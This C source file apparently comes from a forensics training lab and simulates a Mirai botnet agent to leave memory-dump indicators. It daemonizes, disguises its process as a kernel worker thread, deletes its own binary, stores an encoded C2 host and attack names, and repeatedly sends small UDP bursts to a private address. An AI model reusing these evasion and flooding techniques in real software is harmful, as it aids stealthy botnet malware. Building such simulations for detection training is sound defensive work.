/*
 * mirai_sim.c — Mirai IoT Botnet Agent Simulation
 *
 * Memory dump indicators:
 *  - /proc/<pid>/exe → '(deleted)' self-deleted binary
 *  - DDoS attack module strings in heap (UDP flood, SYN flood, etc.)
 *  - C2 IP:port encoded in data segment
 *  - Process name masquerading as kernel thread ['[kworker/u4:2]']
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <time.h>
#include "lab_common.h"

/* ── Attack module strings (visible in heap/memory dumps) ── */
static const char *attack_table[] = {
    "UDP_FLOOD", "SYN_FLOOD", "ACK_FLOOD",
    "HTTP_FLOOD", "DNS_AMP", "ACT_JUNK",
    "VSE", "GREIP", "GREETH", "STOMP",
    NULL
};

/* ── Encoded C2 in data segment (visible in /proc/<pid>/mem) ── */
static const char encoded_c2[] = {
    0x41, 0x42, 0x43, 0x44, 0x2e, 0x64, 0x64, 0x6f, 0x73, 0x2e, 0x63, 0x6f, 0x6d, 0x00
};
static const int  c2_port = 48101;  /* Mirai default */

static int keep_running = 1;
// static void handler(int sig) { keep_running = 0; }
static void handler() { keep_running = 0; }

/* ── Self-delete: unlink the binary so /proc/self/exe shows (deleted) ── */
void self_delete_binary(void) {
    char exe_path[1024];
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (len > 0) {
        exe_path[len] = '\0';
        unlink(exe_path);
    }
    /* Also delete any argv[0] link */
    unlink("/proc/self/exe");
}

void simulate_ddos_flood(void) {
    /* Memory-indicator: allocating flood buffers with attack signatures */
    size_t flood_buf_size = 1024 * 1024;  /* 1 MB */
    char *flood_buf = malloc(flood_buf_size);
    if (flood_buf) {
        memset(flood_buf, 'A', flood_buf_size);
        /* Plant attack type signature in flood buffer */
        snprintf(flood_buf, 128, "MIRAI_FLOOD:UDP_FLOOD_SOURCE_PORT=%05d",
                 rand() % 65535);
    }
    /* Simulate sending packets */
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock >= 0) {
        struct sockaddr_in dst;
        dst.sin_family = AF_INET;
        dst.sin_port = htons(rand() % 65535);
        inet_aton("10.0.0.1", &dst.sin_addr);
        for (int i = 0; i < 100; i++) {
            sendto(sock, flood_buf ? flood_buf : "", 64, MSG_DONTWAIT,
                   (struct sockaddr *)&dst, sizeof(dst));
        }
        close(sock);
    }
    free(flood_buf);
}

int main(int argc, char *argv[]) {
    (void)argc; (void)argv;
    srand(time(NULL) ^ getpid());

    /* ── Daemonize ── */
    if (fork() != 0) exit(0);
    setsid();
    if (fork() != 0) exit(0);

    /* ── Masquerade as kernel worker thread ── */
    prctl(PR_SET_NAME, "[kworker/u4:2]", 0, 0, 0);

    signal(SIGTERM, handler);
    signal(SIGINT,  handler);

    /* ── 1. Self-delete binary → /proc/<pid>/exe shows (deleted) ── */
    self_delete_binary();

    /* ── 2. Plant DDoS attack table in heap (memory dump indicator) ── */
    char **heap_attacks = malloc(sizeof(char *) * 16);
    for (int i = 0; attack_table[i]; i++) {
        heap_attacks[i] = strdup(attack_table[i]);
    }

    /* ── 3. Encode C2 in anon RWX mapping (simulates .data section) ── */
    void *c2_page = mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (c2_page != MAP_FAILED) {
        memcpy(c2_page, encoded_c2, sizeof(encoded_c2));
        *(int *)((char *)c2_page + 256) = c2_port;
        /* Add scan/brute-force marker */
        memcpy((char *)c2_page + 512, "MIRAI_SSH_BRUTE_IN_PROGRESS", 27);
    }

    /* ── 4. Create /proc net marker for C2 scanning ── */
    FILE *c2_marker = fopen("/tmp/.mirai_c2", "w");
    if (c2_marker) {
        fprintf(c2_marker, "c2=%s:%d\n", encoded_c2, c2_port);
        fprintf(c2_marker, "attacks=%s,%s,%s\n",
                attack_table[0], attack_table[1], attack_table[2]);
        fclose(c2_marker);
    }

    log_attack("mirai", "Mirai botnet agent simulation - self-deleted binary active");

    /* ── 5. Main loop: scanning + flood attacks ── */
    while (keep_running) {
        simulate_ddos_flood();
        sleep(3);
    }

    for (int i = 0; attack_table[i]; i++) free(heap_attacks[i]);
    free(heap_attacks);
    if (c2_page != MAP_FAILED) munmap(c2_page, 4096);
    return 0;
}
